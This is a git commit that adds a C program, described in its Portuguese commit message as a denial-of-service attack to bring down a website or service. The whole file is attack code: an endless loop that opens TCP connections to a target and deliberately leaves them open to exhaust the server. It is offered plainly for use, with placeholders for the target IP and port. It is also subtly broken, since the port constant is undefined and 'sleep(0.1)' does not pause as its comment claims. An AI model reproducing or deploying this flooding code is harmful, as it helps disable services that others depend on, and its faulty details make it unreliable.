8b5f200b36a1eaccc483a0ea19ddd3c41fe72de6
CorteF <129459194+CorteF@users.noreply.github.com>
2023-09-03 18:36:31 -0300

    Create DOS.C
    Ataque DOS para derrubar um site / serviço em linguagem C

---
+++ DOS.C
@@ -0,0 +1,37 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+int main(void) {
+    int meusocket;
+    int conecta;
+    struct sockaddr_in alvo;
+
+    alvo.sin_family = AF_INET;
+    alvo.sin_port = htons(PORTA);
+    alvo.sin_addr.s_addr = inet_addr("IP");
+
+    while (1) { // Loop infinito
+        meusocket = socket(AF_INET, SOCK_STREAM, 0);
+        if (meusocket < 0) {
+            perror("Erro ao criar soquete");
+            return 1;
+        }
+
+        conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);
+
+        if (conecta == 0) {
+            printf("Porta Aberta \n");
+        } else {
+            printf("Porta Fechada \n");
+        }
+
+        // Não feche a conexão aqui
+
+        sleep(0.1); // Espere por um milisegundo antes de tentar novamente
+    }
+
+    return 0;
+}
